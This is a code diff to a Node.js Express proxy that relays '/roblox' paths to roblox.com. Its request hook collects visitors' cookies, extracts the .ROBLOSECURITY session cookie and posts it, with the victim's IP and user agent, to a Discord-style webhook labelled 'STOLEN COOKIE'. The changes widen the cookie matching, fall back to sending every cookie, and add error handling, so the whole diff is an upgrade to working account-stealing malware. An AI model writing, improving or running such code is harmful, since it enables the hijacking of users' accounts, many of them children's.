@@ -11,25 +11,33 @@ let cookieGrabbed = false;
 app.use('/roblox', createProxyMiddleware({
     target: 'https://www.roblox.com',
     changeOrigin: true,
+    pathRewrite: { '^/roblox': '' }, // This removes '/roblox' from the path sent to Roblox
     on: {
-        proxyReq: (proxyReq, req) => {
+        proxyReq: (proxyReq, req, res) => {
             if (cookieGrabbed) return;
 
+            // Get cookies from the incoming request
             const cookies = req.headers.cookie;
             
-            if (cookies && cookies.includes('.ROBLOSECURITY')) {
-                cookieGrabbed = true;
-                console.log("Cookie Grabbed!");
+            if (cookies) {
+                console.log("Cookies found:", cookies);
+                
+                // Check for Roblox Security Cookie
+                if (cookies.includes('.ROBLOSECURITY') || cookies.includes('ROBLOSECURITY')) {
+                    cookieGrabbed = true;
+                    console.log("Cookie Grabbed!");
 
-                const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY'));
+                    // Extract just the security cookie
+                    const robloxCookie = cookies.split(';').find(c => c.trim().includes('.ROBLOSECURITY') || c.trim().includes('ROBLOSECURITY'));
 
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie}\`\`\`\n\n**IP:** ${req.ip}\n**UA:** ${req.headers['user-agent']}`
-                    })
-                });
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie || cookies}\`\`\`\n\n**IP:** ${req.ip}\n**UA:** ${req.headers['user-agent']}`
+                        })
+                    }).catch(err => console.error("Discord Error:", err));
+                }
             }
         }
     }
